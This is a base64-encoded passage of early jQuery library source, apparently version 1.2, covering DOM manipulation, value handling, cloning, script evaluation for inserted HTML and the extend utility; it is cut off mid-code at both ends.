ZmluZWQgKQoJCQkJcmV0dXJuIHRoaXMubGVuZ3RoICYmIGpRdWVyeVsgdHlwZSB8fCAiYXR0ciIgXSggdGhpc1swXSwgbmFtZSApIHx8IHVuZGVmaW5lZDsKCgkJCWVsc2UgewoJCQkJb3B0aW9ucyA9IHt9OwoJCQkJb3B0aW9uc1sgbmFtZSBdID0gdmFsdWU7CgkJCX0KCQkKCQkvLyBDaGVjayB0byBzZWUgaWYgd2UncmUgc2V0dGluZyBzdHlsZSB2YWx1ZXMKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKGkpewoJCQkvLyBTZXQgYWxsIHRoZSBzdHlsZXMKCQkJZm9yICggbmFtZSBpbiBvcHRpb25zICkKCQkJCWpRdWVyeS5hdHRyKAoJCQkJCXR5cGUgPwoJCQkJCQl0aGlzLnN0eWxlIDoKCQkJCQkJdGhpcywKCQkJCQluYW1lLCBqUXVlcnkucHJvcCggdGhpcywgb3B0aW9uc1sgbmFtZSBdLCB0eXBlLCBpLCBuYW1lICkKCQkJCSk7CgkJfSk7Cgl9LAoKCWNzczogZnVuY3Rpb24oIGtleSwgdmFsdWUgKSB7CgkJLy8gaWdub3JlIG5lZ2F0aXZlIHdpZHRoIGFuZCBoZWlnaHQgdmFsdWVzCgkJaWYgKCAoa2V5ID09ICd3aWR0aCcgfHwga2V5ID09ICdoZWlnaHQnKSAmJiBwYXJzZUZsb2F0KHZhbHVlKSA8IDAgKQoJCQl2YWx1ZSA9IHVuZGVmaW5lZDsKCQlyZXR1cm4gdGhpcy5hdHRyKCBrZXksIHZhbHVlLCAiY3VyQ1NTIiApOwoJfSwKCgl0ZXh0OiBmdW5jdGlvbiggdGV4dCApIHsKCQlpZiAoIHR5cGVvZiB0ZXh0ICE9ICJvYmplY3QiICYmIHRleHQgIT0gbnVsbCApCgkJCXJldHVybiB0aGlzLmVtcHR5KCkuYXBwZW5kKCAodGhpc1swXSAmJiB0aGlzWzBdLm93bmVyRG9jdW1lbnQgfHwgZG9jdW1lbnQpLmNyZWF0ZVRleHROb2RlKCB0ZXh0ICkgKTsKCgkJdmFyIHJldCA9ICIiOwoKCQlqUXVlcnkuZWFjaCggdGV4dCB8fCB0aGlzLCBmdW5jdGlvbigpewoJCQlqUXVlcnkuZWFjaCggdGhpcy5jaGlsZE5vZGVzLCBmdW5jdGlvbigpewoJCQkJaWYgKCB0aGlzLm5vZGVUeXBlICE9IDggKQoJCQkJCXJldCArPSB0aGlzLm5vZGVUeXBlICE9IDEgPwoJCQkJCQl0aGlzLm5vZGVWYWx1ZSA6CgkJCQkJCWpRdWVyeS5mbi50ZXh0KCBbIHRoaXMgXSApOwoJCQl9KTsKCQl9KTsKCgkJcmV0dXJuIHJldDsKCX0sCgoJd3JhcEFsbDogZnVuY3Rpb24oIGh0bWwgKSB7CgkJaWYgKCB0aGlzWzBdICkKCQkJLy8gVGhlIGVsZW1lbnRzIHRvIHdyYXAgdGhlIHRhcmdldCBhcm91bmQKCQkJalF1ZXJ5KCBodG1sLCB0aGlzWzBdLm93bmVyRG9jdW1lbnQgKQoJCQkJLmNsb25lKCkKCQkJCS5pbnNlcnRCZWZvcmUoIHRoaXNbMF0gKQoJCQkJLm1hcChmdW5jdGlvbigpewoJCQkJCXZhciBlbGVtID0gdGhpczsKCgkJCQkJd2hpbGUgKCBlbGVtLmZpcnN0Q2hpbGQgKQoJCQkJCQllbGVtID0gZWxlbS5maXJzdENoaWxkOwoKCQkJCQlyZXR1cm4gZWxlbTsKCQkJCX0pCgkJCQkuYXBwZW5kKHRoaXMpOwoKCQlyZXR1cm4gdGhpczsKCX0sCgoJd3JhcElubmVyOiBmdW5jdGlvbiggaHRtbCApIHsKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeSggdGhpcyApLmNvbnRlbnRzKCkud3JhcEFsbCggaHRtbCApOwoJCX0pOwoJfSwKCgl3cmFwOiBmdW5jdGlvbiggaHRtbCApIHsKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeSggdGhpcyApLndyYXBBbGwoIGh0bWwgKTsKCQl9KTsKCX0sCgoJYXBwZW5kOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5kb21NYW5pcChhcmd1bWVudHMsIHRydWUsIGZhbHNlLCBmdW5jdGlvbihlbGVtKXsKCQkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkKCQkJCXRoaXMuYXBwZW5kQ2hpbGQoIGVsZW0gKTsKCQl9KTsKCX0sCgoJcHJlcGVuZDogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCB0cnVlLCB0cnVlLCBmdW5jdGlvbihlbGVtKXsKCQkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkKCQkJCXRoaXMuaW5zZXJ0QmVmb3JlKCBlbGVtLCB0aGlzLmZpcnN0Q2hpbGQgKTsKCQl9KTsKCX0sCgkKCWJlZm9yZTogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCBmYWxzZSwgZmFsc2UsIGZ1bmN0aW9uKGVsZW0pewoJCQl0aGlzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKCBlbGVtLCB0aGlzICk7CgkJfSk7Cgl9LAoKCWFmdGVyOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5kb21NYW5pcChhcmd1bWVudHMsIGZhbHNlLCB0cnVlLCBmdW5jdGlvbihlbGVtKXsKCQkJdGhpcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZSggZWxlbSwgdGhpcy5uZXh0U2libGluZyApOwoJCX0pOwoJfSwKCgllbmQ6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLnByZXZPYmplY3QgfHwgalF1ZXJ5KCBbXSApOwoJfSwKCglmaW5kOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJdmFyIGVsZW1zID0galF1ZXJ5Lm1hcCh0aGlzLCBmdW5jdGlvbihlbGVtKXsKCQkJcmV0dXJuIGpRdWVyeS5maW5kKCBzZWxlY3RvciwgZWxlbSApOwoJCX0pOwoKCQlyZXR1cm4gdGhpcy5wdXNoU3RhY2soIC9bXis+XSBbXis+XS8udGVzdCggc2VsZWN0b3IgKSB8fCBzZWxlY3Rvci5pbmRleE9mKCIuLiIpID4gLTEgPwoJCQlqUXVlcnkudW5pcXVlKCBlbGVtcyApIDoKCQkJZWxlbXMgKTsKCX0sCgoJY2xvbmU6IGZ1bmN0aW9uKCBldmVudHMgKSB7CgkJLy8gRG8gdGhlIGNsb25lCgkJdmFyIHJldCA9IHRoaXMubWFwKGZ1bmN0aW9uKCl7CgkJCWlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSAmJiAhalF1ZXJ5LmlzWE1MRG9jKHRoaXMpICkgewoJCQkJLy8gSUUgY29waWVzIGV2ZW50cyBib3VuZCB2aWEgYXR0YWNoRXZlbnQgd2hlbgoJCQkJLy8gdXNpbmcgY2xvbmVOb2RlLiBDYWxsaW5nIGRldGFjaEV2ZW50IG9uIHRoZQoJCQkJLy8gY2xvbmUgd2lsbCBhbHNvIHJlbW92ZSB0aGUgZXZlbnRzIGZyb20gdGhlIG9yaWduYWwKCQkJCS8vIEluIG9yZGVyIHRvIGdldCBhcm91bmQgdGhpcywgd2UgdXNlIGlubmVySFRNTC4KCQkJCS8vIFVuZm9ydHVuYXRlbHksIHRoaXMgbWVhbnMgc29tZSBtb2RpZmljYXRpb25zIHRvIAoJCQkJLy8gYXR0cmlidXRlcyBpbiBJRSB0aGF0IGFyZSBhY3R1YWxseSBvbmx5IHN0b3JlZCAKCQkJCS8vIGFzIHByb3BlcnRpZXMgd2lsbCBub3QgYmUgY29waWVkIChzdWNoIGFzIHRoZQoJCQkJLy8gdGhlIG5hbWUgYXR0cmlidXRlIG9uIGFuIGlucHV0KS4KCQkJCXZhciBjbG9uZSA9IHRoaXMuY2xvbmVOb2RlKHRydWUpLAoJCQkJCWNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwoJCQkJY29udGFpbmVyLmFwcGVuZENoaWxkKGNsb25lKTsKCQkJCXJldHVybiBqUXVlcnkuY2xlYW4oW2NvbnRhaW5lci5pbm5lckhUTUxdKVswXTsKCQkJfSBlbHNlCgkJCQlyZXR1cm4gdGhpcy5jbG9uZU5vZGUodHJ1ZSk7CgkJfSk7CgoJCS8vIE5lZWQgdG8gc2V0IHRoZSBleHBhbmRvIHRvIG51bGwgb24gdGhlIGNsb25lZCBzZXQgaWYgaXQgZXhpc3RzCgkJLy8gcmVtb3ZlRGF0YSBkb2Vzbid0IHdvcmsgaGVyZSwgSUUgcmVtb3ZlcyBpdCBmcm9tIHRoZSBvcmlnaW5hbCBhcyB3ZWxsCgkJLy8gdGhpcyBpcyBwcmltYXJpbHkgZm9yIElFIGJ1dCB0aGUgZGF0YSBleHBhbmRvIHNob3VsZG4ndCBiZSBjb3BpZWQgb3ZlciBpbiBhbnkgYnJvd3NlcgoJCXZhciBjbG9uZSA9IHJldC5maW5kKCIqIikuYW5kU2VsZigpLmVhY2goZnVuY3Rpb24oKXsKCQkJaWYgKCB0aGlzWyBleHBhbmRvIF0gIT0gdW5kZWZpbmVkICkKCQkJCXRoaXNbIGV4cGFuZG8gXSA9IG51bGw7CgkJfSk7CgkJCgkJLy8gQ29weSB0aGUgZXZlbnRzIGZyb20gdGhlIG9yaWdpbmFsIHRvIHRoZSBjbG9uZQoJCWlmICggZXZlbnRzID09PSB0cnVlICkKCQkJdGhpcy5maW5kKCIqIikuYW5kU2VsZigpLmVhY2goZnVuY3Rpb24oaSl7CgkJCQlpZiAodGhpcy5ub2RlVHlwZSA9PSAzKQoJCQkJCXJldHVybjsKCQkJCXZhciBldmVudHMgPSBqUXVlcnkuZGF0YSggdGhpcywgImV2ZW50cyIgKTsKCgkJCQlmb3IgKCB2YXIgdHlwZSBpbiBldmVudHMgKQoJCQkJCWZvciAoIHZhciBoYW5kbGVyIGluIGV2ZW50c1sgdHlwZSBdICkKCQkJCQkJalF1ZXJ5LmV2ZW50LmFkZCggY2xvbmVbIGkgXSwgdHlwZSwgZXZlbnRzWyB0eXBlIF1bIGhhbmRsZXIgXSwgZXZlbnRzWyB0eXBlIF1bIGhhbmRsZXIgXS5kYXRhICk7CgkJCX0pOwoKCQkvLyBSZXR1cm4gdGhlIGNsb25lZCBzZXQKCQlyZXR1cm4gcmV0OwoJfSwKCglmaWx0ZXI6IGZ1bmN0aW9uKCBzZWxlY3RvciApIHsKCQlyZXR1cm4gdGhpcy5wdXNoU3RhY2soCgkJCWpRdWVyeS5pc0Z1bmN0aW9uKCBzZWxlY3RvciApICYmCgkJCWpRdWVyeS5ncmVwKHRoaXMsIGZ1bmN0aW9uKGVsZW0sIGkpewoJCQkJcmV0dXJuIHNlbGVjdG9yLmNhbGwoIGVsZW0sIGkgKTsKCQkJfSkgfHwKCgkJCWpRdWVyeS5tdWx0aUZpbHRlciggc2VsZWN0b3IsIHRoaXMgKSApOwoJfSwKCglub3Q6IGZ1bmN0aW9uKCBzZWxlY3RvciApIHsKCQlpZiAoIHNlbGVjdG9yLmNvbnN0cnVjdG9yID09IFN0cmluZyApCgkJCS8vIHRlc3Qgc3BlY2lhbCBjYXNlIHdoZXJlIGp1c3Qgb25lIHNlbGVjdG9yIGlzIHBhc3NlZCBpbgoJCQlpZiAoIGlzU2ltcGxlLnRlc3QoIHNlbGVjdG9yICkgKQoJCQkJcmV0dXJuIHRoaXMucHVzaFN0YWNrKCBqUXVlcnkubXVsdGlGaWx0ZXIoIHNlbGVjdG9yLCB0aGlzLCB0cnVlICkgKTsKCQkJZWxzZQoJCQkJc2VsZWN0b3IgPSBqUXVlcnkubXVsdGlGaWx0ZXIoIHNlbGVjdG9yLCB0aGlzICk7CgoJCXZhciBpc0FycmF5TGlrZSA9IHNlbGVjdG9yLmxlbmd0aCAmJiBzZWxlY3RvcltzZWxlY3Rvci5sZW5ndGggLSAxXSAhPT0gdW5kZWZpbmVkICYmICFzZWxlY3Rvci5ub2RlVHlwZTsKCQlyZXR1cm4gdGhpcy5maWx0ZXIoZnVuY3Rpb24oKSB7CgkJCXJldHVybiBpc0FycmF5TGlrZSA/IGpRdWVyeS5pbkFycmF5KCB0aGlzLCBzZWxlY3RvciApIDwgMCA6IHRoaXMgIT0gc2VsZWN0b3I7CgkJfSk7Cgl9LAoKCWFkZDogZnVuY3Rpb24oIHNlbGVjdG9yICkgewoJCXJldHVybiAhc2VsZWN0b3IgPyB0aGlzIDogdGhpcy5wdXNoU3RhY2soIGpRdWVyeS5tZXJnZSggCgkJCXRoaXMuZ2V0KCksCgkJCXNlbGVjdG9yLmNvbnN0cnVjdG9yID09IFN0cmluZyA/IAoJCQkJalF1ZXJ5KCBzZWxlY3RvciApLmdldCgpIDoKCQkJCXNlbGVjdG9yLmxlbmd0aCAhPSB1bmRlZmluZWQgJiYgKCFzZWxlY3Rvci5ub2RlTmFtZSB8fCBqUXVlcnkubm9kZU5hbWUoc2VsZWN0b3IsICJmb3JtIikpID8KCQkJCQlzZWxlY3RvciA6IFtzZWxlY3Rvcl0gKSApOwoJfSwKCglpczogZnVuY3Rpb24oIHNlbGVjdG9yICkgewoJCXJldHVybiBzZWxlY3RvciA/CgkJCWpRdWVyeS5tdWx0aUZpbHRlciggc2VsZWN0b3IsIHRoaXMgKS5sZW5ndGggPiAwIDoKCQkJZmFsc2U7Cgl9LAoKCWhhc0NsYXNzOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJcmV0dXJuIHRoaXMuaXMoICIuIiArIHNlbGVjdG9yICk7Cgl9LAoJCgl2YWw6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlpZiAoIHZhbHVlID09IHVuZGVmaW5lZCApIHsKCgkJCWlmICggdGhpcy5sZW5ndGggKSB7CgkJCQl2YXIgZWxlbSA9IHRoaXNbMF07CgoJCQkJLy8gV2UgbmVlZCB0byBoYW5kbGUgc2VsZWN0IGJveGVzIHNwZWNpYWwKCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCBlbGVtLCAic2VsZWN0IiApICkgewoJCQkJCXZhciBpbmRleCA9IGVsZW0uc2VsZWN0ZWRJbmRleCwKCQkJCQkJdmFsdWVzID0gW10sCgkJCQkJCW9wdGlvbnMgPSBlbGVtLm9wdGlvbnMsCgkJCQkJCW9uZSA9IGVsZW0udHlwZSA9PSAic2VsZWN0LW9uZSI7CgkJCQkJCgkJCQkJLy8gTm90aGluZyB3YXMgc2VsZWN0ZWQKCQkJCQlpZiAoIGluZGV4IDwgMCApCgkJCQkJCXJldHVybiBudWxsOwoKCQkJCQkvLyBMb29wIHRocm91Z2ggYWxsIHRoZSBzZWxlY3RlZCBvcHRpb25zCgkJCQkJZm9yICggdmFyIGkgPSBvbmUgPyBpbmRleCA6IDAsIG1heCA9IG9uZSA/IGluZGV4ICsgMSA6IG9wdGlvbnMubGVuZ3RoOyBpIDwgbWF4OyBpKysgKSB7CgkJCQkJCXZhciBvcHRpb24gPSBvcHRpb25zWyBpIF07CgoJCQkJCQlpZiAoIG9wdGlvbi5zZWxlY3RlZCApIHsKCQkJCQkJCS8vIEdldCB0aGUgc3BlY2lmYyB2YWx1ZSBmb3IgdGhlIG9wdGlvbgoJCQkJCQkJdmFsdWUgPSBqUXVlcnkuYnJvd3Nlci5tc2llICYmICFvcHRpb24uYXR0cmlidXRlcy52YWx1ZS5zcGVjaWZpZWQgPyBvcHRpb24udGV4dCA6IG9wdGlvbi52YWx1ZTsKCQkJCQkJCQoJCQkJCQkJLy8gV2UgZG9uJ3QgbmVlZCBhbiBhcnJheSBmb3Igb25lIHNlbGVjdHMKCQkJCQkJCWlmICggb25lICkKCQkJCQkJCQlyZXR1cm4gdmFsdWU7CgkJCQkJCQkKCQkJCQkJCS8vIE11bHRpLVNlbGVjdHMgcmV0dXJuIGFuIGFycmF5CgkJCQkJCQl2YWx1ZXMucHVzaCggdmFsdWUgKTsKCQkJCQkJfQoJCQkJCX0KCQkJCQkKCQkJCQlyZXR1cm4gdmFsdWVzOwoJCQkJCQoJCQkJLy8gRXZlcnl0aGluZyBlbHNlLCB3ZSBqdXN0IGdyYWIgdGhlIHZhbHVlCgkJCQl9IGVsc2UKCQkJCQlyZXR1cm4gKHRoaXNbMF0udmFsdWUgfHwgIiIpLnJlcGxhY2UoL1xyL2csICIiKTsKCgkJCX0KCgkJCXJldHVybiB1bmRlZmluZWQ7CgkJfQoKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWlmICggdGhpcy5ub2RlVHlwZSAhPSAxICkKCQkJCXJldHVybjsKCgkJCWlmICggdmFsdWUuY29uc3RydWN0b3IgPT0gQXJyYXkgJiYgL3JhZGlvfGNoZWNrYm94Ly50ZXN0KCB0aGlzLnR5cGUgKSApCgkJCQl0aGlzLmNoZWNrZWQgPSAoalF1ZXJ5LmluQXJyYXkodGhpcy52YWx1ZSwgdmFsdWUpID49IDAgfHwKCQkJCQlqUXVlcnkuaW5BcnJheSh0aGlzLm5hbWUsIHZhbHVlKSA+PSAwKTsKCgkJCWVsc2UgaWYgKCBqUXVlcnkubm9kZU5hbWUoIHRoaXMsICJzZWxlY3QiICkgKSB7CgkJCQl2YXIgdmFsdWVzID0gdmFsdWUuY29uc3RydWN0b3IgPT0gQXJyYXkgPwoJCQkJCXZhbHVlIDoKCQkJCQlbIHZhbHVlIF07CgoJCQkJalF1ZXJ5KCAib3B0aW9uIiwgdGhpcyApLmVhY2goZnVuY3Rpb24oKXsKCQkJCQl0aGlzLnNlbGVjdGVkID0gKGpRdWVyeS5pbkFycmF5KCB0aGlzLnZhbHVlLCB2YWx1ZXMgKSA+PSAwIHx8CgkJCQkJCWpRdWVyeS5pbkFycmF5KCB0aGlzLnRleHQsIHZhbHVlcyApID49IDApOwoJCQkJfSk7CgoJCQkJaWYgKCAhdmFsdWVzLmxlbmd0aCApCgkJCQkJdGhpcy5zZWxlY3RlZEluZGV4ID0gLTE7CgoJCQl9IGVsc2UKCQkJCXRoaXMudmFsdWUgPSB2YWx1ZTsKCQl9KTsKCX0sCgkKCWh0bWw6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlyZXR1cm4gdmFsdWUgPT0gdW5kZWZpbmVkID8KCQkJKHRoaXMubGVuZ3RoID8KCQkJCXRoaXNbMF0uaW5uZXJIVE1MIDoKCQkJCW51bGwpIDoKCQkJdGhpcy5lbXB0eSgpLmFwcGVuZCggdmFsdWUgKTsKCX0sCgoJcmVwbGFjZVdpdGg6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlyZXR1cm4gdGhpcy5hZnRlciggdmFsdWUgKS5yZW1vdmUoKTsKCX0sCgoJZXE6IGZ1bmN0aW9uKCBpICkgewoJCXJldHVybiB0aGlzLnNsaWNlKCBpLCBpICsgMSApOwoJfSwKCglzbGljZTogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMucHVzaFN0YWNrKCBBcnJheS5wcm90b3R5cGUuc2xpY2UuYXBwbHkoIHRoaXMsIGFyZ3VtZW50cyApICk7Cgl9LAoKCW1hcDogZnVuY3Rpb24oIGNhbGxiYWNrICkgewoJCXJldHVybiB0aGlzLnB1c2hTdGFjayggalF1ZXJ5Lm1hcCh0aGlzLCBmdW5jdGlvbihlbGVtLCBpKXsKCQkJcmV0dXJuIGNhbGxiYWNrLmNhbGwoIGVsZW0sIGksIGVsZW0gKTsKCQl9KSk7Cgl9LAoKCWFuZFNlbGY6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLmFkZCggdGhpcy5wcmV2T2JqZWN0ICk7Cgl9LAoJCglkb21NYW5pcDogZnVuY3Rpb24oIGFyZ3MsIHRhYmxlLCByZXZlcnNlLCBjYWxsYmFjayApIHsKCQl2YXIgY2xvbmUgPSB0aGlzLmxlbmd0aCA+IDEsIGVsZW1zOyAKCgkJcmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbigpewoJCQlpZiAoICFlbGVtcyApIHsKCQkJCWVsZW1zID0galF1ZXJ5LmNsZWFuKCBhcmdzLCB0aGlzLm93bmVyRG9jdW1lbnQgKTsKCgkJCQlpZiAoIHJldmVyc2UgKQoJCQkJCWVsZW1zLnJldmVyc2UoKTsKCQkJfQoKCQkJdmFyIG9iaiA9IHRoaXM7CgoJCQlpZiAoIHRhYmxlICYmIGpRdWVyeS5ub2RlTmFtZSggdGhpcywgInRhYmxlIiApICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbXNbMF0sICJ0ciIgKSApCgkJCQlvYmogPSB0aGlzLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJ0Ym9keSIpWzBdIHx8IHRoaXMuYXBwZW5kQ2hpbGQoIHRoaXMub3duZXJEb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0Ym9keSIpICk7CgoJCQl2YXIgc2NyaXB0cyA9IGpRdWVyeSggW10gKTsKCgkJCWpRdWVyeS5lYWNoKGVsZW1zLCBmdW5jdGlvbigpewoJCQkJdmFyIGVsZW0gPSBjbG9uZSA/CgkJCQkJalF1ZXJ5KCB0aGlzICkuY2xvbmUoIHRydWUgKVswXSA6CgkJCQkJdGhpczsKCgkJCQkvLyBleGVjdXRlIGFsbCBzY3JpcHRzIGFmdGVyIHRoZSBlbGVtZW50cyBoYXZlIGJlZW4gaW5qZWN0ZWQKCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCBlbGVtLCAic2NyaXB0IiApICkgewoJCQkJCXNjcmlwdHMgPSBzY3JpcHRzLmFkZCggZWxlbSApOwoJCQkJfSBlbHNlIHsKCQkJCQkvLyBSZW1vdmUgYW55IGlubmVyIHNjcmlwdHMgZm9yIGxhdGVyIGV2YWx1YXRpb24KCQkJCQlpZiAoIGVsZW0ubm9kZVR5cGUgPT0gMSApCgkJCQkJCXNjcmlwdHMgPSBzY3JpcHRzLmFkZCggalF1ZXJ5KCAic2NyaXB0IiwgZWxlbSApLnJlbW92ZSgpICk7CgoJCQkJCS8vIEluamVjdCB0aGUgZWxlbWVudHMgaW50byB0aGUgZG9jdW1lbnQKCQkJCQljYWxsYmFjay5jYWxsKCBvYmosIGVsZW0gKTsKCQkJCX0KCQkJfSk7CgoJCQlzY3JpcHRzLmVhY2goIGV2YWxTY3JpcHQgKTsKCQl9KTsKCX0KfTsKCi8vIEdpdmUgdGhlIGluaXQgZnVuY3Rpb24gdGhlIGpRdWVyeSBwcm90b3R5cGUgZm9yIGxhdGVyIGluc3RhbnRpYXRpb24KalF1ZXJ5LnByb3RvdHlwZS5pbml0LnByb3RvdHlwZSA9IGpRdWVyeS5wcm90b3R5cGU7CgpmdW5jdGlvbiBldmFsU2NyaXB0KCBpLCBlbGVtICkgewoJaWYgKCBlbGVtLnNyYyApCgkJalF1ZXJ5LmFqYXgoewoJCQl1cmw6IGVsZW0uc3JjLAoJCQlhc3luYzogZmFsc2UsCgkJCWRhdGFUeXBlOiAic2NyaXB0IgoJCX0pOwoKCWVsc2UKCQlqUXVlcnkuZ2xvYmFsRXZhbCggZWxlbS50ZXh0IHx8IGVsZW0udGV4dENvbnRlbnQgfHwgZWxlbS5pbm5lckhUTUwgfHwgIiIgKTsKCglpZiAoIGVsZW0ucGFyZW50Tm9kZSApCgkJZWxlbS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKCBlbGVtICk7Cn0KCmpRdWVyeS5leHRlbmQgPSBqUXVlcnkuZm4uZXh0ZW5kID0gZnVuY3Rpb24oKSB7CgkvLyBjb3B5IHJlZmVyZW5jZSB0byB0YXJnZXQgb2JqZWN0Cgl2YXIgdGFyZ2V0ID0gYXJndW1lbnRzWzBdIHx8IHt9LCBpID0gMSwgbGVuZ3RoID0gYXJndW1lbnRzLmxlbmd0aCwgZGVlcCA9IGZhbHNlLCBvcHRpb25zOwoKCS8vIEhhbmRsZSBhIGRlZXAgY29weSBzaXR1YXRpb24KCWlmICggdGFyZ2V0LmNvbnN0cnVjdG9yID09IEJvb2xlYW4gKSB7CgkJZGVlcCA9IHRhcmdldDsKCQl0YXJnZXQgPSBhcmd1bWVudHNbMV0gfHwge307CgkJLy8gc2tpcCB0aGUgYm9vbGVhbiBhbmQgdGhlIHRhcmdldAoJCWkgPSAyOwoJfQoKCS8vIEhhbmRsZSBjYXNlIHdoZW4gdGFyZ2V0IGlzIGEgc3RyaW5nIG9yIHNvbWV0aGluZyAocG9zc2libGUgaW4gZGVlcCBjb3B5KQoJaWYgKCB0eXBlb2YgdGFyZ2V0ICE9ICJvYmplY3QiICYmIHR5cGVvZiB0YXJnZXQgIT0gImZ1bmN0aW9uIiApCgkJdGFyZ2V0ID0ge307CgoJLy8gZXh0ZW5kIGpRdWVyeSBpdHNlbGYgaWYgb25seSBvbmUgYXJndW1lbnQgaXMgcGFzc2VkCglpZiAoIGxlbmd0aCA9PSAxICkgewoJCXRhcmdldCA9IHRoaXM7CgkJaSA9IDA7Cgl9CgoJZm9yICggOyBpIDwgbGVuZ3RoOyBpKysgKQoJCS8vIE9ubHkgZGVhbCB3aXRoIG5vbi1udWxsL3VuZGVmaW5lZCB2YWx1ZXMKCQlpZiAoIChvcHRpb25zID0gYXJndW1lbnRzWyBpIF0pICE9IG51bGwgKQoJCQkvLyBFeHRlbmQgdGhlIGJhc2Ugb2JqZWN0CgkJCWZvciAoIHZhciBuYW1lIGluIG9wdGlvbnMgKSB7CgkJCQkvLyBQcmV2ZW50IG5ldmVyLWVuZGluZyBsb29wCgkJCQlpZiAoIHRhcmdldCA9PT0gb3B0aW9uc1sgbmFtZSBdICkKCQkJCQljb250aW51ZTsKCgkJCQkvLyBSZWN1cnNlIGlmIHdlJ3JlIG1lcmdpbmcgb2JqZWN0IHZhbHVlcwoJCQkJaWYgKCBkZWVwICYmIG9wdGlvbnNbIG5hbWUgXSAmJiB0eXBlb2Ygb3B0aW9uc1sgbmFtZSBdID09ICJvYmplY3QiICYmIHRhcmdldFsgbmFtZSBdICYmICFvcHRpb25zWyBuYW1lIF0ubm9kZVR5cGUgKQoJCQkJCXRhcmdldFsgbmFtZSBdID0galF1ZXJ5LmV4dGVuZCggdGFyZ2V0WyBuYW1lIF0sIG9wdGlvbnNbIG5hbWUgXSApOwoKCQkJCS8vIERvbid0IGJyaW5nIGluIHVuZGVmaW5lZCB2YWx1ZXMKCQkJCWVsc2UgaWYgKCBvcHRpb25zWyBuYW1lIF0gIT0gdW5kZWZpbmVkICkKCQkJCQl0YXJnZXRbIG5hbWUgXSA9IG9wdGlvbnNbIG5hbWUgXTsKCgkJCX0KCgkvLyBSZXR1cm4gdGhlIG1vZGlmaWVkIG9iamVjdAoJcmV0dXJuIHRhcmdldDsKfTsKCnZhciBleHBhbmRvID0gImpRdWVyeSIgKyAobmV3IERhdGUoKSkuZ2V0VGltZSgpLCB1dWlkID0gMCwgd2luZG93RGF0YSA9IHt9OwoKLy8gZXhjbHVkZSB0aGUgZm9sbG93aW5nIGNzcyBwcm9wZXJ0aWVzIHRvIGFkZCBweAp2YXIgZXhjbHVkZSA9IC96LT9pbmRleHxmb250LT93ZWlnaHR8b3BhY2l0eXx6b29tfGxpbmUtP2hlaWdodC9pOwoKalF1ZXJ5LmV4dGVuZCh7Cglub0NvbmZsaWN0OiBmdW5jdGlvbiggZGVlcCApIHsKCQl3aW5kb3cuJCA9IF8kOwoKCQlpZiAoIGRlZXAgKQoJCQl3aW5kb3cualF1ZXJ5ID0gX2pRdWVyeTsKCgkJcmV0dXJuIGpRdWVyeTsKCX0sCgoJLy8gU2VlIHRlc3QvdW5pdC9jb3JlLmpzIGZvciBkZXRhaWxzIGNvbmNlcm5pbmcgdGhpcyBmdW5jdGlvbi4KCWlzRnVuY3Rpb246IGZ1bmN0aW9uKCBmbiApIHsKCQlyZXR1cm4gISFmbiAmJiB0eXBlb2YgZm4gIT0gInN0cmluZyIgJiYgIWZuLm5vZGVOYW1lICYmIAoJCQlmbi5jb25zdHJ1Y3RvciAhPSBBcnJheSAmJiAvZnVuY3Rpb24vaS50ZXN0KCBmbiArICIiICk7Cgl9LAoJCgkvLyBjaGVjayBpZiBhbiBlbGVtZW50IGlzIGluIGEgKG9yIGlzIGFuKSBYTUwgZG9jdW1lbnQKCWlzWE1MRG9jOiBmdW5jdGlvbiggZWxlbSApIHsKCQlyZXR1cm4gZWxlbS5kb2N1bWVudEVsZW1lbnQgJiYgIWVsZW0uYm9keSB8fAoJCQllbGVtLnRhZ05hbWUgJiYgZWxlbS5vd25lckRvY3VtZW50ICYmICFlbGVtLm93bmVyRG9jdW1lbnQuYm9keTsKCX0sCgoJLy8gRXZhbHVsYXRlcyBhIHNjcmlwdCBpbiBhIGdsb2JhbCBjb250ZXh0CglnbG9iYWxFdmFsOiBmdW5jdGlvbiggZGF0YSApIHsKCQlkYXRhID0galF1ZXJ5LnRyaW0oIGRhdGEgKTsKCgkJaWYgKCBkYXRhICkgewoJCQkvLyBJbnNwaXJlZCBieSBjb2RlIGJ5IEFuZHJlYSBHaWFtbWFyY2hpCgkJCS8vIGh0dHA6Ly93ZWJyZWZsZWN0aW9uLmJsb2dzcG90LmNvbS8yMDA3LzA4L2dsb2JhbC1zY29wZS1ldmFsdWF0aW9uLWFuZC1kb20uaHRtbAoJCQl2YXIgaGVhZCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0gfHwgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LAoJCQkJc2